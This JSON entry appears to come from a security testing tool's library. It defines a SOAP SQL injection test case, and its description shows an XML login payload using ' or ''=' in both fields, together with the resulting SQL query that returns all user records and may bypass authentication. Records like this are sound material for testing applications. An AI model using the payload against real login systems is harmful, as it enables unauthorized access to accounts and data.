{
  "id": "36",
  "name": "SOAP: SQL Injection Test Case 4 - Empty Strings",
  "description": "Step 4 is a variation of step 3:\n\n<login>\n  <username> ' or ''='</username>\n  <password>' or ''='</password>\n</login>\n\nWhich results in the following SQL:\n\nSELECT * FROM users WHERE username ='' or ''='' and Password = '' or ''=''\n\nReturning all records in the database and possibly logging us in.",
  "labels": "",
  "libraryId": "1",
  "guid": "1016139c-4c48-44f0-85cd-0b312be9936b",
  "isHidden": false,
  "isReadOnlyLibraryEntity": false,
  "libraryGuid": "eef7dcf9-53bd-48e9-849d-21445ebad101"
}